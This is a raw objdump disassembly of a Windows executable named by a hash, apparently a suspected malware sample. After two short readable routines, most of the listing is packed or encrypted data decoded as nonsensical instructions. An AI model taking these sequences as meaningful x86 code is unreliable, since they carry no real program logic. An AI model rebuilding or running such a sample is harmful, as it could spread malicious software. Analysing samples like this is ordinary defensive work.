
93b766ee8eb3337a82ecf74470036299b6b35871ae2dc2acba4f0610d6393e73.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    eax,DWORD PTR [ebx+0x1]
  401003:	inc    ebx
  401004:	inc    ecx
  401005:	cmp    al,dl
  401007:	jne    0x401000
  401009:	ret    
  40100a:	int3   
  40100b:	int3   
  40100c:	int3   
  40100d:	int3   
  40100e:	int3   
  40100f:	int3   
  401010:	push   esi
  401011:	xor    eax,eax
  401013:	push   edi
  401014:	mov    edi,DWORD PTR [esp+0x10]
  401018:	mov    esi,DWORD PTR [esp+0xc]
  40101c:	mov    ecx,eax
  40101e:	call   0x40b810
  401023:	cmp    eax,ecx
  401025:	jne    0x40102f
  401027:	or     eax,eax
  401029:	je     0x401032
  40102b:	inc    esi
  40102c:	inc    edi
  40102d:	jmp    0x40101e
  40102f:	xor    eax,eax
  401031:	inc    eax
  401032:	pop    edi
  401033:	pop    esi
  401034:	ret    0x8
  401037:	int3   
  401038:	int3   
  401039:	int3   
  40103a:	int3   
  40103b:	int3   
  40103c:	int3   
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	mov    bl,0xa8
  401042:	lds    edx,FWORD PTR [edx+0x26f40a2]
  401048:	stc    
  401049:	and    eax,0x436241
  40104e:	adc    BYTE PTR [eax+0x0],al
  401051:	add    eax,0x62410040
  401056:	inc    eax
  401057:	add    BYTE PTR [ebx-0x34],al
  40105a:	inc    eax
  40105b:	add    eax,0x78434040
  401060:	bound  eax,QWORD PTR [ecx+0x78]
  401063:	add    eax,0x62404043
  401068:	push   eax
  401069:	push   esp
  40106a:	pushf  
  40106b:	adc    DWORD PTR ds:0x2a311746,0x404053fd
  401075:	test   DWORD PTR [ebx+0x8],ecx
  401078:	cmp    bh,al
  40107a:	lds    eax,FWORD PTR [edx+0x12]
  40107d:	dec    eax
  40107e:	jno    0x4010aa
  401080:	xor    al,0x8e
  401082:	dec    edi
  401083:	icebp  
  401084:	inc    eax
  401085:	add    BYTE PTR [esi-0x10],bh
  401088:	inc    esp
  401089:	mov    DWORD PTR [eax+ecx*8+0x14],eax
  40108d:	daa    
  40108e:	xor    DWORD PTR [eax+0x45],esp
  401091:	pop    edx
  401092:	bound  eax,QWORD PTR es:[eax+0x56]
  401096:	push   ecx
  401097:	mov    dl,0x38
  401099:	aad    0x6a
  40109b:	cmp    eax,0x5404113
  4010a0:	inc    eax
  4010a1:	bound  eax,QWORD PTR [ebx+0x43]
  4010a4:	add    eax,0x62004040
  4010a9:	inc    eax
  4010aa:	add    BYTE PTR [ecx+0x40],al
  4010ad:	inc    ebx
  4010ae:	test   BYTE PTR ds:0x58054041,ah
  4010b4:	inc    eax
  4010b5:	inc    eax
  4010b6:	bound  eax,QWORD PTR [eax+0x66]
  4010b9:	inc    ecx
  4010ba:	inc    eax
  4010bb:	add    eax,0x5d71fd00
  4010c0:	inc    ebp
  4010c1:	ret    
  4010c2:	lods   al,BYTE PTR ds:[esi]
  4010c3:	sub    al,BYTE PTR [eax+0x1]
  4010c6:	dec    eax
  4010c7:	idiv   DWORD PTR [ebx-0x63]
  4010ca:	jnp    0x40110c
  4010cc:	push   cs
  4010cd:	inc    esp
  4010ce:	jno    0x401120
  4010d0:	mov    eax,0x43000019
  4010d5:	inc    eax
  4010d6:	bound  eax,QWORD PTR ds:0x25404110
  4010dc:	add    ah,cl
  4010de:	inc    ebx
  4010df:	add    eax,0x40402562
  4010e4:	add    BYTE PTR [eax+0x40],al
  4010e7:	inc    ecx
  4010e8:	inc    ecx
  4010e9:	add    eax,0x78434025
  4010ee:	bound  eax,QWORD PTR [eax-0x7c]
  4010f1:	inc    eax
  4010f2:	inc    ecx
  4010f3:	imul   eax,DWORD PTR [eax+0x40],0x5246980
  4010fa:	xor    BYTE PTR [edx+0x40],ah
  4010fd:	or     DWORD PTR [ecx],esp
  4010ff:	hlt    
  401100:	ror    bl,1
  401102:	pop    edx
  401103:	leave  
  401104:	fild   DWORD PTR [eax+0x72]
  401107:	and    al,0xff
  401109:	inc    edx
  40110a:	int    0xa8
  40110c:	lds    ebx,FWORD PTR [edi]
  40110e:	add    DWORD PTR [esi+0x547925d],edi
  401114:	dec    edi
  401115:	inc    eax
  401116:	jae    0x401145
  401118:	rcl    esp,1
  40111a:	in     eax,dx
  40111b:	mov    ebx,0x5181143b
  401120:	inc    ecx
  401121:	inc    eax
  401122:	inc    eax
  401123:	inc    ebx
  401124:	int3   
  401125:	add    BYTE PTR ds:0x56240,al
  40112b:	inc    ebx
  40112c:	inc    eax
  40112d:	inc    eax
  40112e:	add    BYTE PTR [ecx+0x62],al
  401131:	bound  eax,QWORD PTR [eax]
  401133:	int3   
  401134:	inc    eax
  401135:	inc    ebx
  401136:	add    eax,0x43624041
  40113b:	adc    BYTE PTR [ecx+0x5],al
  40113e:	inc    eax
  40113f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401140:	or     BYTE PTR [eax+0x3b],0xb9
  401144:	inc    eax
  401145:	inc    eax
  401146:	inc    esi
  401147:	clc    
  401148:	fdivr  QWORD PTR [edx+eiz*2]
  40114b:	ret    
  40114c:	adc    BYTE PTR [eax+0x14f76d11],al
  401152:	arpl   WORD PTR [eax+0x40],dx
  401155:	sub    ebx,DWORD PTR [eax+0x47]
  401158:	daa    
  401159:	lds    edx,FWORD PTR [ebx-0x6e7de6b4]
  40115f:	ds or  eax,0x40fe99c6
  401165:	add    BYTE PTR ds:0x539263f1,0x4f
  40116c:	adc    bl,BYTE PTR [ebp+0x195c3c94]
  401172:	ret    
  401173:	mov    esp,0x43626e40
  401178:	inc    eax
  401179:	adc    BYTE PTR ds:0x4158cc40,al
  40117f:	inc    ebx
  401180:	bound  eax,QWORD PTR [ecx+0x40]
  401183:	add    eax,0x4140
  401188:	and    eax,0x40400062
  40118d:	add    eax,0x84404340
  401192:	int3   
  401193:	js     0x401195
  401195:	inc    ecx
  401196:	adc    BYTE PTR [edx+0xf],ah
  401199:	es std 
  40119b:	and    BYTE PTR [eax],dh
  40119d:	jne    0x4011ec
  40119f:	add    esp,DWORD PTR [eax+0x1d]
  4011a2:	dec    ecx
  4011a3:	xor    BYTE PTR [edx-0x7f],bl
  4011a6:	xchg   ecx,eax
  4011a7:	inc    eax
  4011a8:	add    BYTE PTR [esi-0xa],dh
  4011ab:	rcl    DWORD PTR [ebx+0x5a],0xe4
  4011af:	add    eax,0xa80c2525
  4011b4:	xor    BYTE PTR [ebx+eiz*2+0x6b504040],0x40
  4011bc:	cli    
  4011bd:	push   esp
  4011be:	ins    DWORD PTR es:[edi],dx
  4011bf:	add    al,0x0
  4011c1:	icebp  
  4011c2:	xlat   BYTE PTR ds:[ebx]
  4011c3:	add    DWORD PTR [esi+0x6f408c87],ecx
  4011c9:	add    BYTE PTR [eax+0x41],al
  4011cc:	inc    eax
  4011cd:	inc    ebx
  4011ce:	bound  ax,DWORD PTR ds:0x40434100
  4011d5:	add    eax,0x40054062
  4011da:	bound  eax,QWORD PTR [ecx+0x40]
  4011dd:	inc    ebx
  4011de:	inc    eax
  4011df:	add    eax,0x25405841
  4011e4:	bound  eax,QWORD PTR [eax+0x43]
  4011e7:	inc    eax
  4011e8:	adc    BYTE PTR [ebp-0x5776ce6e],dh
  4011ee:	bound  eax,QWORD PTR [eax-0x58]
  4011f1:	inc    eax
  4011f2:	cdq    
  4011f3:	mov    al,0x5a
  4011f5:	pusha  
  4011f6:	stc    
  4011f7:	inc    eax
  4011f8:	add    dh,BYTE PTR ds:0x9ecd28c8
  4011fe:	inc    eax
  4011ff:	and    al,0x34
  401201:	aaa    
  401202:	mov    al,ds:0x407f4b40
  401207:	inc    eax
  401208:	scas   eax,DWORD PTR es:[edi]
  401209:	push   ebp
  40120a:	xchg   ebp,eax
  40120b:	inc    eax
  40120c:	test   DWORD PTR [esi+0x56814040],ebx
  401212:	test   eax,0xffa82d12
  401217:	inc    eax
  401218:	adc    eax,0x4c795e17
  40121d:	inc    ebp
  40121e:	mov    BYTE PTR [eax+0x41],0x43
  401222:	inc    eax
  401223:	add    eax,0x43406262
  401228:	inc    ecx
  401229:	adc    BYTE PTR [eax],al
  40122b:	inc    eax
  40122c:	add    eax,0x43000562
  401231:	add    BYTE PTR [ecx+0x40],al
  401234:	inc    eax
  401235:	add    eax,0x400062
  40123a:	inc    ebx
  40123b:	inc    eax
  40123c:	js     0x40127f
  40123e:	inc    ecx
  40123f:	bound  eax,QWORD PTR [eax+0x23]
  401242:	cmp    al,0x54
  401244:	cmp    DWORD PTR [eax],ebp
  401246:	pop    edx
  401247:	inc    ecx
  401248:	dec    edi
  401249:	inc    eax
  40124a:	add    dh,BYTE PTR [edx]
  40124c:	pushf  
  40124d:	dec    edx
  40124e:	lds    esp,FWORD PTR [eax]
  401250:	inc    edx
  401251:	inc    eax
  401252:	es and eax,edi
  401255:	push   esi
  401256:	push   esp
  401257:	in     al,0xb0
  401259:	inc    eax
  40125a:	imul   ebx,DWORD PTR [ebp+0x62],0x410540
  401261:	inc    ebx
  401262:	inc    eax
  401263:	inc    eax
  401264:	inc    ecx
  401265:	inc    eax
  401266:	inc    eax
  401267:	bound  eax,QWORD PTR ds:0x5624300
  40126d:	add    BYTE PTR [eax+0x40],al
  401270:	add    BYTE PTR [ecx+0x43],al
  401273:	add    BYTE PTR [eax+0x41],al
  401276:	add    eax,0x40436200
  40127b:	inc    eax
  40127c:	add    eax,0xf134e462
  401281:	bound  eax,QWORD PTR [esi+0x22]
  401284:	add    dh,BYTE PTR [ebx+0x4e]
  401287:	xor    dl,BYTE PTR [ebx+0x1a]
  40128a:	inc    ecx
  40128b:	inc    eax
  40128c:	sub    BYTE PTR [eax],al
  40128e:	fwait
  40128f:	cmp    BYTE PTR [eax],ah
  401291:	test   eax,0x714340c4
  401296:	enter  0xcec,0xa4
  40129a:	mov    DWORD PTR [eax-0x7f],eax
  40129d:	jbe    0x401311
  40129f:	sub    ch,dl
  4012a1:	jno    0x401267
  4012a3:	and    DWORD PTR [eax+0x11],esi
  4012a6:	fimul  WORD PTR [ebx+0x4d]
  4012a9:	jg     0x4012fa
  4012ab:	inc    eax
  4012ac:	add    DWORD PTR [edi+0x62e2fe24],esi
  4012b2:	inc    eax
  4012b3:	inc    eax
  4012b4:	xor    dl,BYTE PTR [eax+0x41]
  4012b7:	inc    eax
  4012b8:	add    eax,0x41624340
  4012bd:	test   BYTE PTR [eax],al
  4012bf:	and    eax,0x404043
  4012c4:	add    BYTE PTR ds:0x626210,al
  4012ca:	add    eax,0x43404140
  4012cf:	inc    eax
  4012d0:	inc    ecx
  4012d1:	add    eax,0x10664062
  4012d6:	inc    ebx
  4012d7:	(bad)  
  4012d8:	aad    0x4c
  4012da:	cli    
  4012db:	push   eax
  4012dc:	mov    esp,0xe3120040
  4012e1:	mov    al,ds:0x504238c7
  4012e6:	sub    DWORD PTR [esi],ebp
  4012e8:	test   eax,0xec6b9938
  4012ed:	inc    eax
  4012ee:	out    dx,al
  4012ef:	dec    ebx
  4012f0:	and    edi,DWORD PTR [edx+eiz*2]
  4012f3:	push   eax
  4012f4:	push   eax
  4012f5:	inc    eax
  4012f6:	dec    edi
  4012f7:	xchg   edx,eax
  4012f8:	in     eax,0x41
  4012fa:	int    0x65
  4012fc:	arpl   WORD PTR [eax+0x0],ax
  4012ff:	xor    dh,BYTE PTR [ebp-0x4]
  401302:	pop    eax
  401303:	js     0x401298
  401305:	add    eax,0x4041cc
  40130a:	add    BYTE PTR [eax],al
  40130c:	inc    eax
  40130d:	inc    eax
  40130e:	inc    ebx
  40130f:	bound  eax,QWORD PTR [eax]
  401311:	inc    eax
  401312:	inc    eax
  401313:	add    eax,0x62434162
  401318:	inc    eax
  401319:	js     0x40132b
  40131b:	inc    ecx
  40131c:	add    eax,0x5404325
  401321:	bound  eax,QWORD PTR [eax+0x40]
  401324:	inc    ecx
  401325:	inc    ebx
  401326:	inc    esp
  401327:	xor    DWORD PTR [eax+esi*1+0x7f],eax
  40132b:	cmc    
  40132c:	inc    eax
  40132d:	dec    ecx
  40132e:	inc    eax
  40132f:	dec    edx
  401330:	mov    cl,0x2a
  401332:	test   al,0x4e
  401334:	mov    ebp,0x54834031
  401339:	mov    ah,0x10
  40133b:	xor    BYTE PTR [edi+0x54],ch
  40133e:	inc    eax
  40133f:	dec    edx
  401340:	and    eax,0x436241
  401345:	adc    BYTE PTR [eax+0x0],al
  401348:	add    eax,0x62410040
  40134d:	inc    eax
  40134e:	add    BYTE PTR [ebx-0x34],al
  401351:	inc    eax
  401352:	add    eax,0x78434040
  401357:	bound  eax,QWORD PTR [ecx+0x78]
  40135a:	add    eax,0x62404043
  40135f:	xlat   BYTE PTR ds:[ebx]
  401360:	iret   
  401361:	inc    ebp
  401362:	or     BYTE PTR [eax+eiz*2+0x47230343],ch
  401369:	xlat   BYTE PTR ds:[ebx]
  40136a:	lds    eax,FWORD PTR [eax+0x39]
  40136d:	inc    eax
  40136e:	jg     0x401343
  401370:	sub    eax,0x4cbdda9d
  401375:	inc    eax
  401376:	mov    eax,DWORD PTR [esi-0x7c]
  401379:	stos   DWORD PTR es:[edi],eax
  40137a:	sahf   
  40137b:	ins    BYTE PTR es:[edi],dx
  40137c:	fwait
  40137d:	inc    eax
  40137e:	jg     0x4013f1
  401380:	pop    ecx
  401381:	inc    esp
  401382:	into   
  401383:	sbb    BYTE PTR [ecx],ah
  401385:	inc    edx
  401386:	mov    edi,0x996bd9ef
  40138b:	inc    eax
  40138c:	fiadd  DWORD PTR [eax+0x79]
  40138f:	dec    esi
  401390:	dec    ecx
  401391:	daa    
  401392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401393:	mov    ebp,0x41814048
  401398:	inc    eax
  401399:	add    eax,0x43436240
  40139e:	add    eax,0x62004040
  4013a3:	inc    eax
  4013a4:	add    BYTE PTR [ecx+0x40],al
  4013a7:	inc    ebx
  4013a8:	test   BYTE PTR ds:0x58054041,ah
  4013ae:	inc    eax
  4013af:	inc    eax
  4013b0:	bound  eax,QWORD PTR [eax+0x66]
  4013b3:	inc    ecx
  4013b4:	inc    eax
  4013b5:	add    eax,0x63111300
  4013ba:	pop    edx
  4013bb:	inc    ebx
  4013bc:	and    DWORD PTR [eax+0x0],eax
  4013bf:	dec    esi
  4013c0:	cli    
  4013c1:	(bad)  
  4013c3:	pusha  
  4013c4:	cmp    DWORD PTR [ecx+0xf],eax
  4013c7:	xor    DWORD PTR [esi+0x5668cc71],ebp
  4013cd:	inc    eax
  4013ce:	dec    DWORD PTR [esi+ecx*2-0x2f]
  4013d2:	or     eax,0x7540c4e0
  4013d7:	xchg   edx,eax
  4013d8:	and    DWORD PTR [eax],eax
  4013da:	add    BYTE PTR [ebx+0x40],al
  4013dd:	bound  eax,QWORD PTR ds:0x25404110
  4013e3:	add    ah,cl
  4013e5:	inc    ebx
  4013e6:	add    eax,0x40402562
  4013eb:	add    BYTE PTR [eax+0x40],al
  4013ee:	inc    ecx
  4013ef:	inc    ecx
  4013f0:	add    eax,0x78434025
  4013f5:	bound  eax,QWORD PTR [eax-0x7c]
  4013f8:	inc    eax
  4013f9:	inc    ecx
  4013fa:	inc    edx
  4013fb:	inc    esp
  4013fc:	push   0x30834072
  401401:	ins    BYTE PTR es:[edi],dx
  401402:	lock out dx,eax
  401404:	inc    edx
  401405:	pusha  
  401406:	inc    ecx
  401407:	push   ebx
  401408:	push   ecx
  401409:	aaa    
  40140a:	mov    esp,0x4062abf9
  40140f:	add    DWORD PTR [ecx+0x40],eax
  401412:	inc    eax
  401413:	inc    ebx
  401414:	int3   
  401415:	add    BYTE PTR ds:0x56240,al
  40141b:	inc    ebx
  40141c:	inc    eax
  40141d:	inc    eax
  40141e:	add    BYTE PTR [ecx+0x62],al
  401421:	bound  eax,QWORD PTR [eax]
  401423:	int3   
  401424:	inc    eax
  401425:	inc    ebx
  401426:	add    eax,0x43624041
  40142b:	adc    BYTE PTR [ecx+0x5],al
  40142e:	inc    eax
  40142f:	rol    DWORD PTR [edi+0x10],1
  401432:	retf   0xca8
  401435:	inc    eax
  401436:	xor    eax,0x5657047
  40143b:	add    eax,0x950440e0
  401440:	(bad)  
  401441:	bound  ebp,QWORD PTR [edx-0x35]
  401444:	bound  eax,QWORD PTR [ebx-0x47]
  401447:	xor    DWORD PTR [eax-0x37],eax
  40144a:	xchg   edi,eax
  40144b:	inc    ebp
  40144c:	mov    ds:0x62194040,eax
  401451:	inc    ebx
  401452:	inc    eax
  401453:	adc    BYTE PTR ds:0x4158cc40,al
  401459:	inc    ebx
  40145a:	bound  eax,QWORD PTR [ecx+0x40]
  40145d:	add    eax,0x4140
  401462:	and    eax,0x40400062
  401467:	add    eax,0x84404340
  40146c:	int3   
  40146d:	js     0x40146f
  40146f:	inc    ecx
  401470:	adc    BYTE PTR [edx+0xf],ah
  401473:	inc    eax
  401474:	mov    esp,0x402043c8
  401479:	sub    DWORD PTR [ecx-0x49],ecx
  40147c:	and    DWORD PTR [ebx],edx
  40147e:	pop    ecx
  40147f:	adc    DWORD PTR [eax+0x59],eax
  401482:	jno    0x4014c4
  401484:	push   ss
  401485:	in     eax,dx
  401486:	shr    al,0x40
  401489:	add    DWORD PTR [edi+0x3c5e6240],ebp
  40148f:	push   0x30
  401491:	out    0x0,al
  401493:	inc    eax
  401494:	imul   eax,DWORD PTR [eax],0x40
  401497:	inc    ecx
  401498:	inc    eax
  401499:	inc    ebx
  40149a:	bound  ax,DWORD PTR ds:0x40434100
  4014a1:	add    eax,0x40054062
  4014a6:	bound  eax,QWORD PTR [ecx+0x40]
  4014a9:	inc    ebx
  4014aa:	inc    eax
  4014ab:	add    eax,0x25405841
  4014b0:	bound  eax,QWORD PTR [eax+0x43]
  4014b3:	inc    eax
  4014b4:	adc    dh,al
  4014b6:	daa    
  4014b7:	jae    0x4014a3
  4014b9:	add    DWORD PTR [ecx+0x40],edx
  4014bc:	cmp    al,0xd
  4014be:	imul   ecx,eax,0x645ca374
  4014c4:	bound  ecx,QWORD PTR [ecx+0x62]
  4014c7:	dec    ebx
  4014c8:	std    
  4014c9:	imul   edi,DWORD PTR [ebx-0x2a15aa04],0xffffffa9
  4014d0:	test   DWORD PTR [ecx-0x6079deb],0x434140d8
  4014da:	inc    eax
  4014db:	add    eax,0x43406262
  4014e0:	inc    ecx
  4014e1:	adc    BYTE PTR [eax],al
  4014e3:	inc    eax
  4014e4:	add    eax,0x43000562
  4014e9:	add    BYTE PTR [ecx+0x40],al
  4014ec:	inc    eax
  4014ed:	add    eax,0x400062
  4014f2:	inc    ebx
  4014f3:	inc    eax
  4014f4:	js     0x401537
  4014f6:	inc    ecx
  4014f7:	bound  eax,QWORD PTR [eax+0x14]
  4014fa:	retf   0x3642
  4014fd:	inc    eax
  4014fe:	arpl   sp,ax
  401500:	test   al,0x1e
  401502:	add    BYTE PTR [ecx+0x5d8402d],0x12
  401509:	gs dec ecx
  40150b:	dec    esi
  40150c:	inc    esi
  40150d:	inc    ecx
  40150e:	jl     0x401565
  401510:	dec    eax
  401511:	dec    esp
  401512:	jno    0x401494
  401514:	xor    al,0x9e
  401516:	xor    al,0xcb
  401518:	inc    edx
  401519:	xor    al,0xec
  40151b:	and    DWORD PTR [esi],eax
  40151d:	adc    al,0x56
  40151f:	or     al,0x66
  401521:	inc    eax
  401522:	add    eax,0x9a604079
  401527:	clc    
  401528:	bound  eax,QWORD PTR [eax+0x5]
  40152b:	inc    ecx
  40152c:	add    BYTE PTR [ebx+0x40],al
  40152f:	inc    eax
  401530:	inc    ecx
  401531:	inc    eax
  401532:	inc    eax
  401533:	bound  eax,QWORD PTR ds:0x5624300
  401539:	add    BYTE PTR [eax+0x40],al
  40153c:	add    BYTE PTR [ecx+0x43],al
  40153f:	add    BYTE PTR [eax+0x41],al
  401542:	add    eax,0x40436200
  401547:	inc    eax
  401548:	add    eax,0x496ce862
  40154d:	add    DWORD PTR [ebp+0x44],esi
  401550:	add    eax,0xc74162c2
  401555:	(bad)  
  401556:	je     0x401594
  401558:	pop    ecx
  401559:	adc    eax,0x8202456b
  40155e:	xchg   ebp,eax
  40155f:	inc    eax
  401560:	loope  0x4015a3
  401562:	cmp    al,0x34
  401564:	mov    esi,0x7d24ab10
  401569:	pop    esi
  40156a:	pop    esp
  40156b:	inc    edx
  40156c:	inc    ecx
  40156d:	adc    ah,BYTE PTR [edi+0x65]
  401570:	ret    
  401571:	hlt    
  401572:	sub    ch,BYTE PTR [ecx+eax*2]
  401575:	inc    eax
  401576:	add    eax,0x41624340
  40157b:	test   BYTE PTR [eax],al
  40157d:	and    eax,0x404043
  401582:	add    BYTE PTR ds:0x626210,al
  401588:	add    eax,0x43404140
  40158d:	inc    eax
  40158e:	inc    ecx
  40158f:	add    eax,0x10664062
  401594:	inc    ebx
  401595:	bound  eax,QWORD PTR [eax-0x62]
  401598:	adc    ah,BYTE PTR [eax+0x67]
  40159b:	cli    
  40159c:	adc    BYTE PTR [edi+0x40],bh
  40159f:	lods   eax,DWORD PTR ds:[esi]
  4015a0:	cmp    BYTE PTR [edx-0x2],bh
  4015a3:	sar    BYTE PTR [eax+ebx*1+0x28406e40],0x40
  4015ab:	or     eax,0x404c2505
  4015b0:	and    eax,0x425f4c34
  4015b5:	dec    ebx
  4015b6:	inc    eax
  4015b7:	add    BYTE PTR [ecx+0x27],dl
  4015ba:	sbb    DWORD PTR [bx+di-0x4],0x40
  4015bf:	sub    al,0x2b
  4015c1:	cs or  al,0x13
  4015c4:	mov    al,ds:0x4041cc05
  4015c9:	add    BYTE PTR [eax],al
  4015cb:	add    BYTE PTR [eax+0x40],al
  4015ce:	inc    ebx
  4015cf:	bound  eax,QWORD PTR [eax]
  4015d1:	inc    eax
  4015d2:	inc    eax
  4015d3:	add    eax,0x62434162
  4015d8:	inc    eax
  4015d9:	js     0x4015eb
  4015db:	inc    ecx
  4015dc:	add    eax,0x5404325
  4015e1:	bound  eax,QWORD PTR [eax+0x40]
  4015e4:	inc    ecx
  4015e5:	inc    ebx
  4015e6:	or     BYTE PTR [eax+0x44],al
  4015e9:	pop    edx
  4015ea:	and    eax,0xa86a5c38
  4015ef:	pop    eax
  4015f0:	add    cl,ah
  4015f2:	or     al,0x44
  4015f4:	pop    edx
  4015f5:	xor    al,0x11
  4015f7:	inc    eax
  4015f8:	pop    ss
  4015f9:	ins    DWORD PTR es:[edi],dx
  4015fa:	and    eax,0x436241
  4015ff:	adc    BYTE PTR [eax+0x0],al
  401602:	add    eax,0x62410040
  401607:	inc    eax
  401608:	add    BYTE PTR [ebx-0x34],al
  40160b:	inc    eax
  40160c:	add    eax,0x78434040
  401611:	bound  eax,QWORD PTR [ecx+0x78]
  401614:	add    eax,0x62404043
  401619:	dec    eax
  40161a:	mov    BYTE PTR [edi+0xf],bl
  40161d:	dec    eax
  40161e:	inc    eax
  40161f:	dec    edx
  401620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401621:	dec    esp
  401622:	and    BYTE PTR [bp+si],0x41
  401626:	inc    eax
  401627:	add    dh,BYTE PTR [edi+0xff8ccac]
  40162d:	je     0x401683
  40162f:	xor    BYTE PTR [ecx+0x42],ah
  401632:	stos   DWORD PTR es:[edi],eax
  401633:	mov    esp,0x24008fc
  401638:	iret   
  401639:	cmp    BYTE PTR [edx-0x5f],al
  40163c:	ins    BYTE PTR es:[edi],dx
  40163d:	arpl   WORD PTR [eax+0x0],ax
  401640:	in     al,0x33
  401642:	stos   DWORD PTR es:[edi],eax
  401643:	push   edx
  401644:	rcl    BYTE PTR [esi],0x40
  401647:	adc    eax,0xd5412f61
  40164c:	ins    BYTE PTR es:[edi],dx
  40164d:	test   eax,0x40413250
  401652:	add    eax,0x43436240
  401657:	add    eax,0x62004040
  40165c:	inc    eax
  40165d:	add    BYTE PTR [ecx+0x40],al
  401660:	inc    ebx
  401661:	test   BYTE PTR ds:0x58054041,ah
  401667:	inc    eax
  401668:	inc    eax
  401669:	bound  eax,QWORD PTR [eax+0x66]
  40166c:	inc    ecx
  40166d:	inc    eax
  40166e:	add    eax,0xfd2c5e00
  401673:	inc    ecx
  401674:	arpl   WORD PTR [eax+0x23612140],di
  40167a:	je     0x401669
  40167c:	rol    BYTE PTR [edx+0x41668040],0x65
  401683:	dec    ebp
  401684:	mov    ds:0xa96040c7,al
  401689:	inc    eax
  40168a:	inc    ecx
  40168b:	and    cl,dh
  40168d:	push   eax
  40168e:	dec    esp
  40168f:	in     al,dx
  401690:	add    BYTE PTR [eax],al
  401692:	inc    ebx
  401693:	inc    eax
  401694:	bound  eax,QWORD PTR ds:0x25404110
  40169a:	add    ah,cl
  40169c:	inc    ebx
  40169d:	add    eax,0x40402562
  4016a2:	add    BYTE PTR [eax+0x40],al
  4016a5:	inc    ecx
  4016a6:	inc    ecx
  4016a7:	add    eax,0x78434025
  4016ac:	bound  eax,QWORD PTR [eax-0x7c]
  4016af:	inc    eax
  4016b0:	inc    ecx
  4016b1:	dec    eax
  4016b2:	sub    al,0xc9
  4016b4:	cmp    ch,BYTE PTR [ecx+0x43]
  4016b7:	inc    eax
  4016b8:	add    ah,BYTE PTR [edx]
  4016ba:	addr16 inc ebp
  4016bc:	int    0xd2
  4016be:	leave  
  4016bf:	inc    eax
  4016c0:	sub    eax,0x5df2492f
  4016c5:	arpl   WORD PTR [ecx+0x40],cx
  4016c8:	pusha  
  4016c9:	add    al,0x3c
  4016cb:	push   eax
  4016cc:	xacquire xchg BYTE PTR [eax+ecx*2],dh
  4016d0:	add    esp,DWORD PTR [ebx+0x43]
  4016d3:	adc    ecx,DWORD PTR [ebp+0x69]
  4016d6:	adc    al,BYTE PTR [eax-0x29]
  4016d9:	dec    edi
  4016da:	sub    cl,al
  4016dc:	and    cl,dl
  4016de:	and    al,BYTE PTR [eax-0x7f]
  4016e1:	and    ecx,DWORD PTR [ebp+0x62]
  4016e4:	cmp    BYTE PTR [ecx+0x48],al
  4016e7:	inc    ecx
  4016e8:	inc    eax
  4016e9:	inc    eax
  4016ea:	inc    ebx
  4016eb:	int3   
  4016ec:	add    BYTE PTR ds:0x56240,al
  4016f2:	inc    ebx
  4016f3:	inc    eax
  4016f4:	inc    eax
  4016f5:	add    BYTE PTR [ecx+0x62],al
  4016f8:	bound  eax,QWORD PTR [eax]
  4016fa:	int3   
  4016fb:	inc    eax
  4016fc:	inc    ebx
  4016fd:	add    eax,0x43624041
  401702:	adc    BYTE PTR [ecx+0x5],al
  401705:	inc    eax
  401706:	inc    eax
  401707:	push   ebx
  401708:	popa   
  401709:	and    eax,0x1560c56d
  40170e:	inc    esp
  40170f:	and    BYTE PTR [edi+0x444ac436],0xcb
  401716:	inc    eax
  401717:	pop    ss
  401718:	mov    bh,0x29
  40171a:	(bad)
  40171f:	sub    al,0x5e
  401721:	sub    al,0x62
  401723:	inc    ebx
  401724:	inc    eax
  401725:	adc    BYTE PTR ds:0x4158cc40,al
  40172b:	inc    ebx
  40172c:	bound  eax,QWORD PTR [ecx+0x40]
  40172f:	add    eax,0x4140
  401734:	and    eax,0x40400062
  401739:	add    eax,0x84404340
  40173e:	int3   
  40173f:	js     0x401741
  401741:	inc    ecx
  401742:	adc    BYTE PTR [edx+0xf],ah
  401745:	xchg   edi,eax
  401746:	dec    eax
  401747:	shl    DWORD PTR [esp],0x32
  40174b:	and    eax,0x65302801
  401750:	inc    eax
  401751:	add    DWORD PTR gs:[esi+0x6d],edx
  401755:	addr16 ss add al,0x60
  401759:	pusha  
  40175a:	bound  esp,QWORD PTR [ecx+0x25f5330]
  401760:	inc    esp
  401761:	jp     0x4016e4
  401763:	ins    DWORD PTR es:[edi],dx
  401764:	and    eax,0x29a481a9
  401769:	sub    BYTE PTR [ecx+eiz*4+0x25],ch
  40176d:	test   al,0xfa
  40176f:	(bad)  
  401771:	xor    al,0x81
  401773:	jge    0x401780
  401775:	adc    BYTE PTR [edx+eiz*2+0x4000275b],al
  40177c:	inc    ecx
  40177d:	inc    eax
  40177e:	inc    ebx
  40177f:	bound  ax,DWORD PTR ds:0x40434100
  401786:	add    eax,0x40054062
  40178b:	bound  eax,QWORD PTR [ecx+0x40]
  40178e:	inc    ebx
  40178f:	inc    eax
  401790:	add    eax,0x25405841
  401795:	bound  eax,QWORD PTR [eax+0x43]
  401798:	inc    eax
  401799:	adc    BYTE PTR [eax],dl
  40179b:	and    DWORD PTR [eax-0x48],esp
  40179e:	mov    ch,0x6d
  4017a0:	xor    al,0x2e
  4017a2:	add    DWORD PTR [edx+edi*2+0x42],esp
  4017a6:	pop    ebx
  4017a7:	pop    esp
  4017a8:	inc    eax
  4017a9:	and    eax,0x634a2560
  4017ae:	retf   
  4017af:	fs pop esp
  4017b1:	or     al,0x59
  4017b3:	test   BYTE PTR [esp+edi*1-0x70],0xb8
  4017b8:	inc    ecx
  4017b9:	ins    DWORD PTR es:[edi],dx
  4017ba:	push   edx
  4017bb:	jmp    0xfc5379f0
  4017c0:	ret    0x8934
  4017c3:	dec    esp
  4017c4:	and    edx,DWORD PTR [ecx]
  4017c6:	pop    esp
  4017c7:	std    
  4017c8:	shr    BYTE PTR [esi],0x39
  4017cb:	and    eax,0x635a4325
  4017d0:	fs inc eax
  4017d2:	inc    ecx
  4017d3:	inc    ebx
  4017d4:	inc    eax
  4017d5:	add    eax,0x43406262
  4017da:	inc    ecx
  4017db:	adc    BYTE PTR [eax],al
  4017dd:	inc    eax
  4017de:	add    eax,0x43000562
  4017e3:	add    BYTE PTR [ecx+0x40],al
  4017e6:	inc    eax
  4017e7:	add    eax,0x400062
  4017ec:	inc    ebx
  4017ed:	inc    eax
  4017ee:	js     0x401831
  4017f0:	inc    ecx
  4017f1:	bound  eax,QWORD PTR [eax+0x25]
